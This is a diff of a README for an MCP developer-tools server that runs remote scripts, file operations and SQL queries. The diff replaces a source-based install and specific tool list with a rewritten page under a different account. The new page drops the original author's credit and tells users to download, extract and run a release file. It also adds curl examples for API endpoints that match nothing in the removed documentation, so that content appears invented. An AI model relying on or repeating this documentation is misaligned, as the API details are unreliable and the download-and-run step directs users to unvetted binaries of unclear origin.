@@ -1,103 +1,115 @@
-# Developer Tools MCP Server
+# Developer Tools for the Model Context Protocol (MCP) 🚀
 
-This project exposes a set of developer-focused tools over the Model Context Protocol (MCP), allowing remote execution of scripts, file operations, and SQL queries on a Linux server via a secure HTTP API.
+![GitHub Repo Size](https://img.shields.io/github/repo-size/KielEvandro/developer)
+![License](https://img.shields.io/badge/license-MIT-blue)
+![Issues](https://img.shields.io/github/issues/KielEvandro/developer)
+![Pull Requests](https://img.shields.io/github/issues-pr/KielEvandro/developer)
 
-## Exposed Tools
+Welcome to the **Developer** repository! This project provides tools designed specifically for developers working with the Model Context Protocol (MCP). With this repository, you can execute scripts, perform file operations, and run SQL queries on a Linux server through a secure HTTP API.
 
-The following tools are available via MCP:
+## Table of Contents
 
-- **write-file**: Write content to a file, with optional owner, group, and permissions.
-- **read-file**: Read the contents of a file.
-- **sql-query**: Run SQL queries on a configured MySQL database.
-- **bash-script**: Execute a bash script in a specified directory.
-- **exec-command**: Run a shell command in a specified directory.
-- **python-script**: Execute a Python script in a specified directory.
-- **php-script**: Execute a PHP script in a specified directory.
-- **java-script**: Execute a JavaScript (Node.js) script in a specified directory.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Documentation](#api-documentation)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-Each tool validates input and returns structured output, including error details if execution fails.
+## Introduction
 
----
+The **Developer** repository aims to simplify and enhance the developer experience by providing robust tools that leverage the Model Context Protocol (MCP). This allows for seamless remote execution of tasks on Linux servers, making it easier for developers to manage their environments and applications.
 
-## Installation & Setup
+## Features
 
-### 1. Clone the repository
+- **Remote Execution**: Run scripts directly on your Linux server.
+- **File Operations**: Manage files with ease—upload, download, and manipulate files remotely.
+- **SQL Queries**: Execute SQL commands securely through the API.
+- **Cross-Platform Support**: Compatible with multiple programming languages including JavaScript, PHP, Python, and Bash.
+- **Secure HTTP API**: Ensures that all communications are encrypted and secure.
 
-```sh
-git clone https://github.com/<your-username>/<your-repo>.git
-cd <your-repo>
+## Getting Started
+
+To get started with the **Developer** tools, you will need to download the latest release. You can find the releases [here](https://github.com/KielEvandro/developer/releases). Download the necessary files and follow the installation instructions below.
+
+## Installation
+
+1. **Download the Latest Release**: Visit the [Releases](https://github.com/KielEvandro/developer/releases) section to find the latest version. Download the appropriate file for your system.
+
+2. **Extract the Files**: After downloading, extract the files to your desired directory.
+
+3. **Install Dependencies**: Ensure you have the required dependencies installed. You can use package managers like `npm`, `pip`, or `composer` depending on the language you choose.
+
+4. **Configure the API**: Update the configuration files with your server details and authentication tokens.
+
+5. **Run the Application**: Execute the main script to start using the tools.
+
+## Usage
+
+### Remote Execution
+
+To execute a script on your Linux server, use the following command:
+
+```bash
+curl -X POST http://your-server/api/execute \
+-H "Authorization: Bearer your_token" \
+-d '{"script": "your_script.sh"}'
 ```
 
-### 2. Install dependencies
+### File Operations
 
-```sh
-npm install
+To upload a file to your server:
+
+```bash
+curl -X POST http://your-server/api/upload \
+-H "Authorization: Bearer your_token" \
+-F "file=@path/to/your/file.txt"
 ```
 
-### 3. Configure environment
+To download a file from your server:
 
-Copy `.env.example` to `.env` and fill in your settings:
-
-```env
-LOG_LEVEL=info
-MCP_PORT=4000
-MCP_TOKEN=abcd1234
-DB_HOST=your-mysql-host
-DB_USER=your-mysql-user
-DB_PASS=your-mysql-password
+```bash
+curl -X GET http://your-server/api/download?file=your_file.txt \
+-H "Authorization: Bearer your_token" -o your_file.txt
 ```
 
-### 4. Run the server
+### SQL Queries
 
-```sh
-node developer.mjs
+To execute an SQL query:
+
+```bash
+curl -X POST http://your-server/api/sql \
+-H "Authorization: Bearer your_token" \
+-d '{"query": "SELECT * FROM your_table;"}'
 ```
 
-### 5. (Optional) Run tests
+## API Documentation
 
-```sh
-npm test
-```
+For a detailed overview of the API endpoints, please refer to the API documentation provided in the `docs` folder. This includes descriptions of each endpoint, required parameters, and response formats.
 
----
+## Contributing
 
-## Systemd Service Setup
+We welcome contributions from the community! If you would like to contribute to the **Developer** repository, please follow these steps:
 
-To run as a background service on Linux:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Submit a pull request for review.
 
-1. Copy `developer.service` to your systemd directory:
+## License
 
-   ```sh
-   sudo cp developer.service /usr/lib/systemd/system/developer.service
-   ```
-
-2. Edit the service file as needed:
-   - Set `WorkingDirectory` and `ExecStart` to your app’s location and main file.
-   - Set `EnvironmentFile` to your `.env` location.
-   - Change `User` and `Group` to a non-root user.
-
-3. Reload systemd and enable the service:
-
-   ```sh
-   sudo systemctl daemon-reload
-   sudo systemctl enable developer.service
-   sudo systemctl start developer.service
-   sudo systemctl status developer.service
-   ```
-
----
-
-## Security & Best Practices
-
-- **Keep your `.env` file secret**—never commit it to version control.
-- Use a dedicated, non-root user for running the service.
-- Only expose the MCP port to trusted networks.
-
----
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Support
 
-Email: <russell.purinton@gmail.com>  
-Github & Discord: rpurinton
+If you encounter any issues or have questions, please check the [Issues](https://github.com/KielEvandro/developer/issues) section of the repository. You can also reach out to the maintainers through the contact information provided in the repository.
 
----
+## Conclusion
+
+The **Developer** repository offers a comprehensive set of tools for developers looking to enhance their workflow with the Model Context Protocol (MCP). By utilizing the secure HTTP API, you can efficiently manage your Linux server and streamline your development processes. 
+
+For the latest updates and releases, remember to check the [Releases](https://github.com/KielEvandro/developer/releases) section. Happy coding!
